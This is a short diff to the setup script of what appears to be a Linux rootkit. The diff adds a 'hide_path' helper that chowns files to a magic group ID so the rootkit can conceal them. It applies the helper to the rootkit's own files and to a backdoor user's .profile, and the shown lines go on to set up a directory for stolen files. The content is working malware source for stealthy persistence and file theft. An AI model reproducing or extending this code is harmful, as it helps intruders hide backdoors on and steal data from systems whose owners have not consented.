@@ -1,3 +1,5 @@
+hide_path(){ chown -h 0:$MAGIC_GID $1; } # -h in case path is a symbolic link
+
 # hides rootkit files within the home/install directory, and
 # other any files created in the setup stage.
 hide_rootkitfiles(){  # $1 = home/install directory
@@ -15,7 +17,7 @@ hide_rootkitfiles(){  # $1 = home/install directory
     for file in ${hide_files[@]}; do
         [ ! -f $file ] && touch $file # if it doesn't exist rn, create it before hiding it.
                                       # it should, at some point soon, get used.
-        chown -h 0:$MAGIC_GID $file # -h in case file is a link to another
+        hide_path $file
     done
 }
 
@@ -49,12 +51,13 @@ setup_home(){ # $1 = home/install directory
     for file in ${COPY_FILES[@]}; do
         local dest=$homedir/`basename $file`
         cp $file $dest && \
-        [ `toggle_enabled HIDE_SELF` == "true" ] && chown 0:$MAGIC_GID $dest
+        [ `toggle_enabled HIDE_SELF` == "true" ] && hide_path $dest
     done
 
-    [ -f $homedir/.bashrc ] && \
-        echo '. .bashrc' > "$homedir/.profile" # see etc/bd_bashrc for backdoor-user
-                                                 # specific settings.
+    [ -f $homedir/.bashrc ] &&  { \
+        echo '. .bashrc' > "$homedir/.profile" && \
+        hide_path $homedir/.profile
+    }
 
     [ `toggle_enabled FILE_STEAL` == "true" ] && { \
         necho "Setting up path for stolen files" && \
